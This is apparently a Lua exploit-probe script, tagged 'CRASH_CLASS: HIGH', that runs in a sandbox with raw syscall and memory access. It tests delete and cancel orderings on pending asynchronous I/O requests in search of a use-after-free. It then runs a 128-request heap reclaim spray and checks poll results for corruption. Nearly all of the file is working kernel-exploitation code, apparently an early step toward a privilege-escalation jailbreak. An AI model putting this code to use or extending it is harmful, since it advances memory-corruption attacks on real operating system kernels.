-- CRASH_CLASS: HIGH
-- PROBE 605a: operation orderings on a pending aio request, and a reclaim spray
print("=== PROBE 605a: PENDING ORDERINGS ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end

local sc_sp,sc_create,sc_poll=mk(135),mk(669),mk(664)
local sc_del,sc_write,sc_cancel=mk(662),mk(4),mk(666)
local sv=memory.alloc(8) wq(N(sv),uint64(0))
pcall(function() sc_sp(uint64(1),uint64(1),uint64(0),U(N(sv))) end)
local fda,fdb=rd(N(sv)),rd(N(sv)+4)
print(string.format("[A] fd_a=%d fd_b=%d",fda,fdb))

local buf=memory.alloc(0x4000)
local data=memory.alloc(0x100)
local out=memory.alloc(0x40)
local cell=memory.alloc(16)
local pollo=memory.alloc(0x40)

local function pending()
    for i=0,0xFC,4 do wd(N(data)+i,0) end
    wd(N(data)+0,0) wd(N(data)+4,fda)
    wq(N(data)+8,U(N(buf))) wq(N(data)+0x10,uint64(0x4000)) wq(N(data)+0x18,uint64(0))
    wq(N(out),uint64(0))
    local ok,rv=pcall(function() return sc_create(uint64(1),U(N(data)),uint64(1),uint64(1),U(N(out))) end)
    if not ok or N(rv)~=0 then return nil end
    return rd(N(out))
end
local function call(f,id)
    wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
    local ok,rv=pcall(function() return f(U(N(cell)),uint64(1),U(N(pollo))) end)
    return N(rv), rd(N(pollo))
end

local id=pending()
if not id then print("[B] create failed"); return end
local r1,s1=call(sc_del,id)
print(string.format("[B] pending id=%08X delete ret=%d status=%08X",id,r1,s1))
local r2,s2=call(sc_cancel,id)
print(string.format("[C] then cancel ret=%d status=%08X",r2,s2))
wd(N(cell),id) wd(N(pollo),0xCCCCCCCC)
pcall(function() sc_poll(U(N(cell)),uint64(1),U(N(pollo))) end)
print(string.format("[D] poll=%08X",rd(N(pollo))))

local id2=pending()
if id2 then
    local r3,s3=call(sc_cancel,id2)
    print(string.format("[E] pending id=%08X cancel ret=%d status=%08X",id2,r3,s3))
    local r4,s4=call(sc_del,id2)
    print(string.format("[F] then delete ret=%d status=%08X",r4,s4))
end

-- [G] reclaim spray then let the first request complete
print("[G] reclaim spray then completion")
local id3=pending()
if id3 then
    local r5,s5=call(sc_del,id3)
    print(string.format("  deleted pending id=%08X ret=%d status=%08X",id3,r5,s5))
    local sprayed={}
    for k=1,128 do
        local nid=pending()
        if nid then sprayed[#sprayed+1]=nid end
    end
    print(string.format("  sprayed=%d",#sprayed))
    local msg=memory.alloc(0x200)
    for i=0,0x1FC,4 do wd(N(msg)+i,0x42424242) end
    pcall(function() sc_write(U(fdb),U(N(msg)),uint64(0x200),uint64(0),uint64(0),uint64(0)) end)
    local bad=0
    for k=1,#sprayed do
        wd(N(cell),sprayed[k]) wd(N(pollo),0xCCCCCCCC)
        pcall(function() sc_poll(U(N(cell)),uint64(1),U(N(pollo))) end)
        local v=rd(N(pollo))
        if v~=3 and v~=0x10003 then bad=bad+1 end
    end
    print(string.format("  sprayed polls unusual=%d",bad))
end

print("[H] health")
local okc,badc=0,0
for k=1,4 do
    local i2=pending()
    if i2 then
        local r,s=call(sc_del,i2)
        if r==0 and s==0 then okc=okc+1 else badc=badc+1 end
    else badc=badc+1 end
end
print(string.format("  health ok=%d bad=%d",okc,badc))
print("[Z] alive")
